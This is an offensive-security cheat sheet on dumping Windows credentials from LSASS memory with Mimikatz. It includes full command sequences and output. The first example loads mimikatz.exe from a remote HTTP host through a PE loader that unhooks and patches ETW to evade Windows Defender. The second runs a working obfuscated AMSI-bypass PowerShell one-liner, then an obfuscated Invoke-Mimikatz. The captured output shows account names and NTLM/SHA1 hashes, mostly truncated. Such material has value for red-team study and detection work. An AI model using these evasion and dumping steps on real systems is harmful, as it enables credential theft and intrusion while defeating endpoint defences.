==================================================================================================================================
OS Credential Dumping (LSASS) using 'MIMIKATZ' (both '.exe' and '.ps1' versions)
==================================================================================================================================

After a user logs on a Windows computer, the system generates and stores a variety of credential materials in LSASS process memory. 
Our objective is to extract the password hashes of the local and/or domain accounts stored in the memory of the Local Security 
Authority Subsystem Service (LSASS process) of a target Windows computer. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping the LSASS process.

> Usefull link: https://attack.mitre.org/techniques/T1003/001/

The tool Mimikatz and its powershell version 'invoke-mikikatz.ps1' can be used to extract the credentials from the LSASS process 
memory of a Windows coomputer.

=> https://github.com/gentilkiwi/mimikatz

Mimikatz commands to dump/extract the credentials:
> privilege::debug
> sekurlsa::logonpasswords


---------------------------------------------------------------------------------------------------------------------------------
Example 1. Use 'Mimikatz.exe' to dump/extract the Windows password hashes stored in the live memory (LSASS) of a Windows server  
---------------------------------------------------------------------------------------------------------------------------------

Note: Since the tool 'Mimikatz.exe' is detected by AV products, we use in this exemple the tool 'fileremotepe' to bypass the 
Windows Defender AV running on the target Windows server 2016.

c:\temp>remotepev1.exe
[+] Unhooking
[+] Patch ETW
[+] Enter the uri :
http://192.168.1.113:8080/mimikatz.exe

[+] Loading Remote PE from http://192.168.1.113:8080/mimikatz.exe
[+] Run PE

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 194073 (00000000:0002f619)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ORACLESERVER1
Logon Server      : ORACLESERVER1
Logon Time        : 11/27/2022 7:10:57 PM
SID               : S-1-5-21-1644803877-2661921197-3301414406-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * NTLM     : cf3a5525ee9414229e66279623<SNIP>
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * Password : (null)
        ssp :
        credman :

<SNIP>

--------------------------------------------------------------------------------------------------------------------------------------
Example 2. Use 'Invoke-Mimikatz.ps1' to dump/extract the Windows password hashes stored in the live memory (LSASS) of a Windows laptop  
--------------------------------------------------------------------------------------------------------------------------------------

Note: Since the PowerShell script 'Invoke-Mimikatz.ps1' is detected by AV products, we use in this exemple an obfuscated version of the
script ('Invoke-Obfuscated-Mimi.ps1' with a function named 'invoke-mimi') and an AMSI bypass technique to not be blocked by the Windows
Defender AV running on the target Windows 10 laptop.


PS C:\Users\Administrator\Documents\Tools-AD> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\Tools-AD> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
PS C:\Users\Administrator\Documents\Tools-AD> (  GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}"-f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

PS C:\Users\Administrator\Desktop> . .\Invoke-Obfuscated-Mimi.ps1

PS C:\Users\Administrator\Desktop> Invoke-Mimi             

PS C:\Users\Administrator\Desktop> Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 278910927 (00000000:109fd7cf)
Session           : Interactive from 5
User Name         : Administrator
Domain            : Laptop1
Logon Server      : Laptop1
Logon Time        : 31/10/2022 20:12:25
SID               : S-1-5-21-936125016-2310263949-2175806047-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : Laptop1
         * NTLM     : 413eb6b2b7676dcf83d35b3eb<SNIP>
         * SHA1     : d92b88b5912ff7112ce3690ab<SNIP>
        tspkg :
<SNIP>
